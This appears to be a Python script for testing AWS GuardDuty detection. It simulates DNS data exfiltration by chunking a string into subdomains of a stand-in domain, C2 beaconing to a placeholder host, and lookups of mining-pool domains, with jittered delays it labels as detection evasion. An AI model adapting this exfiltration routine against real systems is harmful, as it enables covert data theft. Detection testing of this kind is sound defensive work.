#!/usr/bin/env python3
"""
DNS Exfiltration Simulation

This script simulates DNS-based data exfiltration attempts that
GuardDuty can detect. It makes DNS queries to known malicious
domains that GuardDuty monitors.

WARNING: Only run this in a controlled test environment!

Author: Cloud Security Portfolio
"""

import socket
import random
import time
import argparse
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Known test domains that trigger GuardDuty findings
# These are AWS-documented test domains
GUARDDUTY_TEST_DOMAINS = [
    "guarddutyc2activityb.com",
    "guarddutyc2activityb!dns.com", 
]

# Simulated malicious domains (for demonstration)
SIMULATED_MALICIOUS_DOMAINS = [
    "malware-c2-server.example.com",
    "cryptominer-pool.example.net",
    "data-exfil.example.org",
    "phishing-kit.example.com",
]

# Cryptocurrency mining pool domains (triggers CryptoCurrency findings)
CRYPTO_MINING_DOMAINS = [
    "pool.minergate.com",
    "xmr.pool.example.com",
    "stratum.bitcoin.example.com",
]


def simulate_dns_query(domain: str, verbose: bool = False) -> bool:
    """
    Simulate a DNS query to the specified domain.
    
    Args:
        domain: Domain to query
        verbose: Enable verbose output
        
    Returns:
        bool: True if query was made (regardless of result)
    """
    try:
        logger.info(f"Querying domain: {domain}")
        
        # Attempt DNS resolution
        socket.setdefaulttimeout(5)
        result = socket.gethostbyname(domain)
        
        if verbose:
            logger.info(f"  Resolved to: {result}")
            
        return True
        
    except socket.gaierror as e:
        if verbose:
            logger.warning(f"  DNS resolution failed (expected): {e}")
        return True  # Query was still made
        
    except socket.timeout:
        if verbose:
            logger.warning(f"  DNS query timed out")
        return True
        
    except Exception as e:
        logger.error(f"  Error: {e}")
        return False


def simulate_data_exfiltration(data: str, base_domain: str) -> None:
    """
    Simulate DNS-based data exfiltration by encoding data in subdomains.
    
    Args:
        data: Data to "exfiltrate"
        base_domain: Base domain to use for exfiltration
    """
    logger.info(f"Simulating data exfiltration via DNS...")
    
    # Encode data in chunks (simulating real exfiltration technique)
    chunk_size = 30  # Max subdomain label length is 63
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    
    for i, chunk in enumerate(chunks):
        # Encode chunk (in real attack, would use base64 or hex)
        encoded = chunk.replace(' ', '-').lower()
        subdomain = f"{encoded}.{i}.exfil.{base_domain}"
        
        logger.info(f"  Exfiltrating chunk {i+1}/{len(chunks)}: {subdomain}")
        simulate_dns_query(subdomain)
        
        # Random delay to avoid detection (in real attack)
        time.sleep(random.uniform(0.5, 2.0))


def simulate_c2_communication() -> None:
    """Simulate Command & Control communication patterns."""
    logger.info("Simulating C2 communication patterns...")
    
    for i in range(5):
        # Simulate beacon
        beacon_domain = f"beacon-{random.randint(1000, 9999)}.c2server.example.com"
        simulate_dns_query(beacon_domain)
        
        # Random delay (simulating beacon interval)
        delay = random.uniform(10, 30)
        logger.info(f"  Waiting {delay:.1f}s for next beacon...")
        time.sleep(delay)


def simulate_crypto_mining() -> None:
    """Simulate cryptocurrency mining pool connections."""
    logger.info("Simulating cryptocurrency mining pool connections...")
    
    for domain in CRYPTO_MINING_DOMAINS:
        simulate_dns_query(domain, verbose=True)
        time.sleep(1)


def run_guardduty_trigger_test() -> None:
    """
    Run queries against GuardDuty test domains.
    These domains are specifically designed to trigger GuardDuty findings.
    """
    logger.info("=" * 60)
    logger.info("Running GuardDuty Trigger Test")
    logger.info("=" * 60)
    
    print("\n⚠️  WARNING: This will generate GuardDuty findings!")
    print("   Only run this in a test environment.\n")
    
    confirm = input("Continue? (yes/no): ")
    if confirm.lower() != 'yes':
        logger.info("Test cancelled")
        return
    
    for domain in GUARDDUTY_TEST_DOMAINS:
        logger.info(f"\nQuerying GuardDuty test domain: {domain}")
        simulate_dns_query(domain, verbose=True)
        time.sleep(2)
    
    logger.info("\n" + "=" * 60)
    logger.info("Test complete! Check GuardDuty console for findings.")
    logger.info("Findings may take up to 15 minutes to appear.")
    logger.info("=" * 60)


def main():
    parser = argparse.ArgumentParser(
        description="DNS Exfiltration Simulation for GuardDuty Testing"
    )
    
    parser.add_argument(
        '--mode',
        choices=['trigger', 'exfil', 'c2', 'crypto', 'all'],
        default='trigger',
        help='Simulation mode to run'
    )
    
    parser.add_argument(
        '--verbose', '-v',
        action='store_true',
        help='Enable verbose output'
    )
    
    args = parser.parse_args()
    
    print("""
╔════════════════════════════════════════════════════════════════╗
║         DNS Exfiltration Simulation Tool                       ║
║         For GuardDuty Testing                                  ║
╚════════════════════════════════════════════════════════════════╝
    """)
    
    logger.info(f"Starting simulation in '{args.mode}' mode...")
    logger.info(f"Timestamp: {datetime.now().isoformat()}")
    
    if args.mode == 'trigger':
        run_guardduty_trigger_test()
    elif args.mode == 'exfil':
        simulate_data_exfiltration(
            "This is simulated sensitive data being exfiltrated via DNS",
            "example.com"
        )
    elif args.mode == 'c2':
        simulate_c2_communication()
    elif args.mode == 'crypto':
        simulate_crypto_mining()
    elif args.mode == 'all':
        run_guardduty_trigger_test()
        simulate_data_exfiltration("test data", "example.com")
        simulate_crypto_mining()
    
    logger.info("\nSimulation complete!")


if __name__ == "__main__":
    main()